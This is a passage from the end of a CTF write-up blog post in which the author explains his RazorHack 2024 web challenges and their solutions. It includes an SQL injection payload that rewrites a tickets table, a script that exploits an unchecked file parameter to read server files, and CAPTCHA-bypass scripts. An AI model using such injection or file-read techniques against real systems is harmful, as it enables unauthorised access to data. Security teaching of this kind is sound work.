    <span class="hljs-attr">"TICKET_DATE"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2023-05-09"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"TICKET_COMPLETE"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span>
<span class="hljs-punctuation">}</span>
</code></pre>
                <p>
                    That payload looks like this:
                    <em>'); UPDATE TICKETS SET TICKET_COMPLETE = 1 --</em>.
                    Running the payload and looking back on the tables gives us
                    the flag: <strong>flag{legit_number_one_19373}</strong>.
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\best-in-class-4.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>We're Definitely Doing This Again...</h3>
                <p>
                    <em
                        ><strong
                            >Okay, now this is starting to get annoying. I have
                            actually seen this puzzle before, but they seem to
                            have made it 100x harder by adding a 5 minute timer!
                            This is impossible, so I am going to call it
                            quits...</strong
                        ></em
                    >
                    <em><strong>~ John from IT</strong></em>
                </p>
                <p><em>Solved: 0/33</em></p>
                <p>
                    This is the second challenge from last years JS Gauntlet
                    that made a return. This one seemed more popular as it has a
                    very simple concept: complete the jigsaw puzzle. Only
                    problem is that now you have a time limit of 5 minutes,
                    which means that you must write a script (I would love to
                    see this type of thing get speedran, but I highly doubt that
                    to be possible). The Russian comment says:
                    <strong
                        >I actually took this from a guy called CodingAP. If he
                        didn't want his puzzles being copied, then he wouldn't
                        have put them out so easily...</strong
                    >. That comment is a hint that you can look at my previous
                    write up to see the way to do it (although no one made it
                    here for that to matter ): ).
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\were-definitely-doing-this-again-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    The solution is the same from last year: write a script that
                    solves it for you. You read where the piece should go, move
                    it there, and keep doing it until all pieces are in the
                    right place and the flag shows up. Here is the script I
                    used, which runs based off key inputs to allow for better
                    control of how it is done (copy and paste into console to
                    make it work).
                </p>
                <pre><code class="hljs language-javascript">current = { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> };

<span class="hljs-keyword">const</span> <span class="hljs-title function_">parseLocation</span> = (<span class="hljs-params"></span>) => {
    <span class="hljs-keyword">let</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#piece-location'</span>).<span class="hljs-property">innerHTML</span>;
    <span class="hljs-keyword">let</span> numbers = str.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/[\(\)]/g</span>)[<span class="hljs-number">1</span>].<span class="hljs-title function_">split</span>(<span class="hljs-string">', '</span>).<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Number</span>);
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">x</span>: numbers[<span class="hljs-number">0</span>], <span class="hljs-attr">y</span>: numbers[<span class="hljs-number">1</span>] }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">moveTo</span> = (<span class="hljs-params">x, y</span>) => {
    <span class="hljs-keyword">let</span> dx = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(current.<span class="hljs-property">x</span> - x);
    <span class="hljs-keyword">let</span> dy = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(current.<span class="hljs-property">y</span> - y);

    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: <span class="hljs-string">' '</span> }));

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < dx; i++) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: (current.<span class="hljs-property">x</span> < x) ? <span class="hljs-string">'ArrowRight'</span> : <span class="hljs-string">'ArrowLeft'</span> }));
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < dy; i++) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: (current.<span class="hljs-property">y</span> < y) ? <span class="hljs-string">'ArrowDown'</span> : <span class="hljs-string">'ArrowUp'</span> }));
    }

    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: <span class="hljs-string">' '</span> }));

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < dx; i++) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: (current.<span class="hljs-property">x</span> < x) ? <span class="hljs-string">'ArrowLeft'</span> : <span class="hljs-string">'ArrowRight'</span> }));
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < dy; i++) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: (current.<span class="hljs-property">y</span> < y) ? <span class="hljs-string">'ArrowUp'</span> : <span class="hljs-string">'ArrowDown'</span> }));
    }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">setCurrent</span> = (<span class="hljs-params">x, y</span>) => {
    <span class="hljs-keyword">let</span> dx = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(current.<span class="hljs-property">x</span> - x);
    <span class="hljs-keyword">let</span> dy = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(current.<span class="hljs-property">y</span> - y);

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < dx; i++) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: (current.<span class="hljs-property">x</span> < x) ? <span class="hljs-string">'ArrowRight'</span> : <span class="hljs-string">'ArrowLeft'</span> }));
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < dy; i++) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyboardEvent</span>(<span class="hljs-string">'keydown'</span>, { <span class="hljs-attr">key</span>: (current.<span class="hljs-property">y</span> < y) ? <span class="hljs-string">'ArrowDown'</span> : <span class="hljs-string">'ArrowUp'</span> }));
    }

    current.<span class="hljs-property">x</span> = x;
    current.<span class="hljs-property">y</span> = y;
}

<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keydown'</span>, <span class="hljs-function"><span class="hljs-params">event</span> =></span> {
    <span class="hljs-keyword">let</span> pos = <span class="hljs-title function_">parseLocation</span>();
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> == <span class="hljs-string">'r'</span> && (current.<span class="hljs-property">x</span> !== pos.<span class="hljs-property">x</span> || current.<span class="hljs-property">y</span> !== pos.<span class="hljs-property">y</span>)) {
        <span class="hljs-title function_">moveTo</span>(pos.<span class="hljs-property">x</span>, pos.<span class="hljs-property">y</span>);
    }

    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> == <span class="hljs-string">'w'</span> && current.<span class="hljs-property">y</span> != <span class="hljs-number">0</span>) {
        <span class="hljs-title function_">setCurrent</span>(current.<span class="hljs-property">x</span>, current.<span class="hljs-property">y</span> - <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> == <span class="hljs-string">'a'</span> && current.<span class="hljs-property">x</span> != <span class="hljs-number">0</span>) {
        <span class="hljs-title function_">setCurrent</span>(current.<span class="hljs-property">x</span> - <span class="hljs-number">1</span>, current.<span class="hljs-property">y</span>);
    }

    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> == <span class="hljs-string">'s'</span> && current.<span class="hljs-property">y</span> != <span class="hljs-number">19</span>) {
        <span class="hljs-title function_">setCurrent</span>(current.<span class="hljs-property">x</span>, current.<span class="hljs-property">y</span> + <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> == <span class="hljs-string">'d'</span> && current.<span class="hljs-property">x</span> != <span class="hljs-number">31</span>) {
        <span class="hljs-title function_">setCurrent</span>(current.<span class="hljs-property">x</span> + <span class="hljs-number">1</span>, current.<span class="hljs-property">y</span>);
    }
});
</code></pre>
                <p>
                    After running it (press 'r' to move piece, and 'wasd' to
                    move selector in the right place instead of the arrow keys),
                    the flag shows up:
                    <strong>flag{i_actually_wasnt_sorry_83911}</strong>.
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\were-definitely-doing-this-again-2.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>We Will Never Surrender!</h3>
                <p>
                    <em
                        ><strong
                            >Ok, we got most of stuff back, but if we can get
                            the master key, we can get access to the terminal
                            and finally secure our systems. The problem is the
                            only copy of the master key is on the server that
                            the attackers have access to. After all this, it
                            seems that they have locked it down and we cannot
                            access any file. Please, this is the last thing I
                            ask of you...</strong
                        ></em
                    >
                    <em><strong>~ Justin from IT</strong></em>
                </p>
                <p><em>Solved: 0/33</em></p>
                <p>
                    The final challenge! This one probably the most difficult,
                    but it does show a lot of cool stuff. This was originally
                    going to be an XSS attack through the notification system,
                    but it was too similar to the one in Jungle Calls last year
                    (doesn't stop me from reusing other challenges, but I
                    digress). The Russian comment says:
                    <strong
                        >It seems like the master key is just placed in the root
                        directory of the server application called 'flag'. What
                        a stupid idea! I'll just, you know, spread this around
                        to where you can't find it so easily...</strong
                    >.
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\we-will-never-surrender.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    As the comment suggests, we need to read a file called
                    'flag' on the root server. If we look at the logs dropdown
                    in the <em>Account Settings</em> dialog, we see that in
                    order to fetch the log contents, it sends a file URL to the
                    server. We can tell because it says
                    <em>logs/[log_name].log</em>, which hints at a file
                    structure of some sort. We can use this to access any file
                    on the root server, like so...
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFile</span> = (<span class="hljs-params">file</span>) => {
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/stage8/show_notification'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
        <span class="hljs-attr">headers</span>: {
            <span class="hljs-string">'content-type'</span>: <span class="hljs-string">'application/json'</span>
        },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ file })
    }).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =></span> response.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =></span> {
        <span class="hljs-comment">// ew, data.data.data</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">byte</span> =></span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(byte)).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>))
    })
}

<span class="hljs-title function_">getFile</span>(<span class="hljs-string">'flag'</span>);
<span class="hljs-comment">// flag{we</span>
<span class="hljs-comment">// c3JjL2FwaS5qcw==</span>
</code></pre>
                <p>
                    This gives us the first part of the flag as well as an
                    encoded string. If we decode this string from base64, we get
                    another file path: <em>src/api.js</em>. We can continue this
                    until we find all flag parts...
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-title function_">getFile</span>(<span class="hljs-string">'src/api.js'</span>);
<span class="hljs-comment">// ... some code ...</span>
<span class="hljs-comment">// _have_bea</span>
<span class="hljs-comment">// aW5kZXguanM= (base64 decode: index.js)</span>
<span class="hljs-comment">// ... some code ...</span>

<span class="hljs-title function_">getFile</span>(<span class="hljs-string">'index.js'</span>);
<span class="hljs-comment">// ... some code ...</span>
<span class="hljs-comment">// ten_them</span>
<span class="hljs-comment">// cHVibGljL2ltZy9jb25ncmF0cy5wbmc= (base64 decode: public/img/congrats.png)</span>
<span class="hljs-comment">// ... some code ...</span>

<span class="hljs-title function_">getFile</span>(<span class="hljs-string">'public/img/congrats.png'</span>);
<span class="hljs-comment">// it is an image, shown below</span>
</code></pre>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\congrats.jpg"
                        style="width: 75%"
                    />
                </div>
                <p>
                    To actually get the image file, I wrote another script that
                    fetches and stores it in a file (written in NodeJS)...
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">'node:fs'</span>;

<span class="hljs-keyword">const</span> file = <span class="hljs-string">'public/img/congrats.png'</span>;

<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'http://razorhack-js-gauntlet-2.chals.io/api/stage8/show_notification'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
    <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">'content-type'</span>: <span class="hljs-string">'application/json'</span>,
        <span class="hljs-attr">cookie</span>: cookie
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ file })
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =></span> response.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =></span> {
    fs.<span class="hljs-title function_">writeFileSync</span>(file, <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(data.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>));
})
</code></pre>
                <p>
                    After all this work, we can compile all the parts together
                    to get the final flag:
                    <strong>flag{we_have_beaten_them_14765}</strong>.
                </p>
                <p>
                    I wanted this to be a cool reward after completing the
                    challenges, as you can see most of the code that handles
                    what you did. You can even see all the other code if you
                    wanted to, it just wouldn't have the flag involved. As said
                    previously, though, no one made it this far.
                </p>
                <hr />
                <h3>hogCAPTCHA</h3>
                <p>
                    Another thing that was hosted with this web challenge was
                    two custom CAPTCHAs that both me and my girlfriend
                    developed. These were not in the same style as JS Gauntlet
                    2, but since it was hosted on the same container and they
                    are web challenges, it makes sense to put them here.
                </p>
                <p>
                    Both CAPTCHAs start out with a button that takes them to the
                    CAPTCHA...
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\hogCAPTCHA-1.jpg"
                        style="width: 50%"
                    />
                </div>
                <p>
                    Both were generated with ChatGPT and not created from
                    scratch, which you can tell if you actually competed at
                    RazorHack because they were buggy and I had to fix them.
                </p>
                <hr />
                <h3>hogCAPTCHApt1</h3>
                <p><em>Solved: 33/33</em></p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\hogCAPTCHApt1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    This CAPTCHA consisted of filling in all the words from a
                    letter given to all the competitors. The letter says:
                </p>
                <p>
                    <strong
                        >Team, I hope this message finds you securely. Youve
                        been briefed on the situation, but I want to make it
                        clear how delicate this operation is. We are dealing
                        with a potential insider threat at our nuclear facility,
                        and the stakes couldnt be higher. If this individual is
                        able to compromise any of our core systemsespecially
                        the reactor and cooling stationsthe results could be
                        catastrophic, not just for us, but for everyone in the
                        surrounding area. Your objective is simple: find the
                        intruder, confirm their methods, and neutralize the
                        threat before any real damage is done. The trick is to
                        do it without alerting themor anyone else in the
                        facility. Youll be working under the guise of routine
                        system audits and updates, but your real task is much
                        more critical. Youll be granted high-level access under
                        the radar, which should allow you to monitor the plants
                        network traffic and internal communications. We've
                        already identified some data that should help you get
                        started in your investigation. Youll need to confirm if
                        were dealing with a skilled saboteur or just someone
                        testing boundaries. Do not communicate with anyone
                        outside this team unless absolutely necessary, and if
                        you need to reach me, use the secure channel we
                        discussed in the briefing. We need this done quickly,
                        quietly, and thoroughly. Time is not on our side. Report
                        any findings directly to me. We cant afford even the
                        smallest mistake here. Good luck, and stay invisible.
                        Shane Barnabas, CIO, RazorPower Co.</strong
                    >
                </p>
                <p>
                    Each of the input had to be filled correctly, which means
                    that you had to either a.) look at the physical letter given
                    and painstakingly copy it down, or b.) make a script because
                    all the answers were in the code. Some of the bugs include
                    punctuation being included, which confused people; weird
                    characters from the letter being included (apparently ' and
                     are not the same character, as is - and ); and the input
                    not correctly encoding the words the same way as you type
                    them. And we made this the first challenge of the entire CTF
                    and you had to complete this before you can try the other
                    challenges! Luckily, it only took about 5 minutes to fix,
                    and most people found workarounds, so it wasn't the worst
                    thing. After entering all the words, or using the script
                    below...
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'input'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">input</span> =></span> {
    input.<span class="hljs-property">value</span> = input.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-answer'</span>);
});
</code></pre>
                <p>
                    ...you will get the flag:
                    <strong>flag{f1rst_fl4g_0f_th3-d4y!}</strong>.
                </p>
                <hr />
                <h3>hogCAPTCHApt2</h3>
                <p><em>Solved: 8/33</em></p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\hogCAPTCHApt2.jpg"
                        style="width: 75%"
                    />
                </div>
                <p>
                    This is probably the worst CTF challenge I have ever made.
                    Made with ChatGPT and not much care, this challenge straight
                    up didn't work. Some of it is not my fault, though. In this
                    challenge, you need to click all pixels that have a blue
                    component that is greater than 100, so all you would need to
                    do is run a script that does it for you, right? I've made so
                    many challenges like this, and they all seem to work, so why
                    not this one? Well, I thought so to. In fact, here is a
                    script that worked for me...
                </p>
                <pre><code class="hljs language-javascript">indexes = []
imageData = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'canvas'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>).<span class="hljs-title function_">getImageData</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>, <span class="hljs-number">200</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y < canvas.<span class="hljs-property">height</span>; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x < canvas.<span class="hljs-property">width</span>; x++) {
        <span class="hljs-keyword">let</span> index = <span class="hljs-number">4</span> * (y * canvas.<span class="hljs-property">width</span> + x);
        <span class="hljs-keyword">if</span> (imageData.<span class="hljs-property">data</span>[index + <span class="hljs-number">2</span>] > <span class="hljs-number">100</span>) indexes.<span class="hljs-title function_">push</span>(index / <span class="hljs-number">4</span>)
    }
}
clickedPixels = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(indexes)
</code></pre>
                <p>
                    This, along with clicking once on the image shows the flag
                    for me: <strong>flag{pr33ty_c0l0rs!!!}</strong>. Key words:
                    <em>FOR ME</em>. For some reason, this code would not
                    consistenly work on other people's devices. First, I tried
                    simulating clicks through the event dispatcher, which didn't
                    work consistently. Then, Firefox and Chromium-based browsers
                    handle images on canvases differently, meaning that there
                    would be different pixels that would be clicked on each
                    browser. Then, even with the same settings and everything,
                    some computers just didn't get the right answer, even with
                    the same script! I just decided that it wasn't worth it and
                    just gave anyone whose answer looks correct the flag
                    manually, which kinda sucks.
                </p>
                <hr />
                <h3>Conclusion</h3>
                <p>
                    I think in terms of last year, this year went way better.
                    The hosting wasn't a problem, the challenges (mostly) didn't
                    have breaking bugs. I didn't stay up until 3am the night
                    before creating these challenges. I would say it went off
                    without a hitch. I do wish that more people completed the
                    challenges as I did like the further ones I did, but at
                    least people can see it in the blog post now. Thanks for
                    reading if you made it this far! If you haven't yet, take a
                    look at my other write-ups for RazorHack 2024!
                </p>
                <ul>
                    <li>
                        <a
                            href="https://codingap.github.io/blog/posts/razorhack-ctf-2024-breakroom-adventure/"
                            >Breakroom Adventure Write-Up</a
                        >
                    </li>
                    <li>
                        <a
                            href="https://codingap.github.io/blog/posts/razorhack-ctf-2024-format-frenzy/"
                            >Format Frenzy Write-Up</a
                        >
                    </li>
                </ul>
            </article>

            <footer class="footer-custom">
                <section
                    class="d-flex justify-content-center justify-content-lg-between p-4"
                >
                    <div class="text-start">
                        <a
                            href="https://youtube.com/CodingAP"
                            class="lead glowing-link"
                        >
                            <i class="fab fa-youtube"></i>
                        </a>
                        <a
                            href="https://twitter.com/Coding_AP"
                            class="lead glowing-link"
                        >
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a
                            href="https://www.linkedin.com/in/alex-prosser-a8524a221/"
                            class="lead glowing-link"
                        >
                            <i class="fab fa-linkedin"></i>
                        </a>
                        <a
                            href="https://github.com/CodingAP"
                            class="lead glowing-link"
                        >
                            <i class="fab fa-github"></i>
                        </a>
                        <br />
                        <a
                            class="glowing-link"
                            onclick="document.body.scrollTop = 0; document.documentElement.scrollTop = 0;"
                        >
                            Back to top
                        </a>
                    </div>

                    <div class="text-end">
                        <a class="glowing-link" href="https://discord.com"
                            >excellentap</a
                        ><br />
                        <a
                            class="glowing-link"
                            href="mailto:alex.prosser.uark@gmail.com"
                            >alex.prosser.uark@gmail.com</a
                        ><br />
                        <span class="glowing"
                            > 2024 Copyright - Alex Prosser</span
                        >
                    </div>
                </section>
            </footer>
        </div>

        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8"
            crossorigin="anonymous"
        ></script>
        <script
            src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
            integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
            crossorigin="anonymous"
        ></script>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.min.js"
            integrity="sha384-7VPbUDkoPSGFnVtYi0QogXtr74QeVeeIs99Qfg5YCF+TidwNdjvaKZX19NZ/e6oz"
            crossorigin="anonymous"
        ></script>
    </body>
</html>
